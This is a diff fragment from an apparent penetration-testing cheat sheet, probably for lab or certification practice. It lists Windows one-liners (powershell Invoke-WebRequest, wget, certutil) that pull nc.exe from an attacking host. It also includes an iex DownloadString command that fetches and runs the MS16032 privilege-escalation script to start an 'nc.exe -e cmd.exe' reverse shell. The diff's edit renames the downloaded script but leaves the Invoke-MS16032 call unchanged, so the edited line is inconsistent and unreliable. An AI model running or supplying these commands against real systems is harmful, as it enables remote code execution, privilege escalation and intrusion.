@@ -304,7 +304,7 @@ png,jpg,config,html,asp,aspx,php,php5,xml,htm,exe
 - powershell -c Invoke-Webrequest -OutFile nc.exe http://10.9.1.255:8080/nc.exe
 - powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
 - certutil -urlcache -f http://$attacking:80/nc.exe nc.exe
-- iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
+- iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/Invoke-Powershell.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
   - Append Command End of script
   - Invoke-Name_Script -Reverse -IP 123 -Port 123
 - **SMB**
